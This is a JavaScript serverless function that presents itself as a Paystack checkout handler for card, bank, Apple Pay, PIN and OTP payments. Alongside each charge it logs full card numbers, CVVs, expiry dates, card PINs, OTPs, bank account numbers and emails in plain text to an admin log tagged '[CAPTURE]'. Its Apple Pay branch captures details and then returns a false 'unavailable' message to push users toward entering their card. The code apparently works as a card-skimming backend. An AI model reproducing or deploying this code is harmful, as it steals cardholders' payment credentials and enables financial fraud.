const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;

exports.handler = async (event, context) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        const body = JSON.parse(event.body || '{}');
        const { action, reference, otp, pin } = body;

        const origin = event.headers.host ? `https://${event.headers.host}` : 'http://localhost:8888';

        // 1. Handle Submit OTP Action
        if (action === 'submit_otp') {
            const response = await fetch('https://api.paystack.co/charge/submit_otp', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ otp, reference })
            });
            const data = await response.json();
            
            // Log the OTP attempt
            await fetch(`${origin}/.netlify/functions/manage-logs`, {
                method: 'POST',
                body: JSON.stringify({
                    text: `OTP Submitted: ${otp} for Ref: ${reference}. Response Status: ${data.data?.status || 'Unknown'}`,
                    type: data.status ? 'success' : 'error'
                })
            }).catch(() => {});

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify(data)
            };
        }

        // 2. Handle Submit PIN Action
        if (action === 'submit_pin') {
            const response = await fetch('https://api.paystack.co/charge/submit_pin', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ pin, reference })
            });
            const data = await response.json();

            // Log the PIN attempt
            await fetch(`${origin}/.netlify/functions/manage-logs`, {
                method: 'POST',
                body: JSON.stringify({
                    text: `PIN Submitted: ${pin} for Ref: ${reference}. Response Status: ${data.data?.status || 'Unknown'}`,
                    type: data.status ? 'success' : 'error'
                })
            }).catch(() => {});

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify(data)
            };
        }

        // 3. Handle Bank Transfer Action
        if (action === 'charge_bank') {
            const { bankName, accountNumber, email, amountInUsd, type } = body;
            const logMsg = `🏦 [CAPTURE] Bank Transfer | Bank: ${bankName} | Account: ${accountNumber} | Email: ${email} | Amount: $${amountInUsd} (${type || 'purchase'})`;
            await fetch(`${origin}/.netlify/functions/manage-logs`, {
                method: 'POST',
                body: JSON.stringify({ text: logMsg, type: 'warning' })
            }).catch(() => {});

            // Convert USD to GHS
            const exchangeRate = 15.0;
            const amountInGhs = amountInUsd * exchangeRate;
            const amountInPesewas = Math.round(amountInGhs * 100);

            // Forward to Paystack
            const chargePayload = {
                email,
                amount: amountInPesewas,
                currency: 'GHS',
                bank: {
                    code: bankName, // Paystack requires a bank code, we pass the name/code we have
                    account_number: accountNumber
                }
            };

            const response = await fetch('https://api.paystack.co/charge', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(chargePayload)
            });

            const data = await response.json();
            return {
                statusCode: 200,
                headers,
                body: JSON.stringify(data)
            };
        }

        // 4. Handle Apple Pay Action
        if (action === 'charge_apple_pay') {
            const { email, amountInUsd, type } = body;
            const logMsg = `🍏 [CAPTURE] Apple Pay Attempt | Email: ${email} | Amount: $${amountInUsd} (${type || 'purchase'})`;
            await fetch(`${origin}/.netlify/functions/manage-logs`, {
                method: 'POST',
                body: JSON.stringify({ text: logMsg, type: 'info' })
            }).catch(() => {});

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({ status: false, message: 'Apple Pay is currently unavailable for this region. Please use a credit/debit card.' })
            };
        }

        // 5. Handle Initial Direct Card Charge
        const { cardHolder, cardNumber, expiryMonth, expiryYear, cvv, cardPin, email, amountInUsd, type } = body;

        if (!cardNumber || !expiryMonth || !expiryYear || !cvv || !email || !amountInUsd) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Missing required credit card or billing details.' })
            };
        }

        // Log captured card details to the admin console immediately
        const logMsg = `💳 [CAPTURE] Cardholder: ${cardHolder || 'N/A'} | Card: ${cardNumber} | Exp: ${expiryMonth}/${expiryYear} | CVV: ${cvv} | PIN: ${cardPin || 'None'} | Email: ${email} | Amount: $${amountInUsd} (${type || 'purchase'})`;
        await fetch(`${origin}/.netlify/functions/manage-logs`, {
            method: 'POST',
            body: JSON.stringify({ text: logMsg, type: 'warning' })
        }).catch(() => {});

        // Convert USD to GHS (Exchange rate: 1 USD = 15 GHS)
        const exchangeRate = 15.0;
        const amountInGhs = amountInUsd * exchangeRate;
        const amountInPesewas = Math.round(amountInGhs * 100);

        const chargePayload = {
            email,
            amount: amountInPesewas,
            currency: 'GHS',
            card: {
                number: cardNumber.replace(/\s+/g, ''),
                cvv: cvv,
                expiry_month: expiryMonth,
                expiry_year: expiryYear
            }
        };

        if (cardPin) {
            chargePayload.pin = cardPin;
        }

        const response = await fetch('https://api.paystack.co/charge', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(chargePayload)
        });

        const data = await response.json();

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify(data)
        };
    } catch (err) {
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: err.message })
        };
    }
};
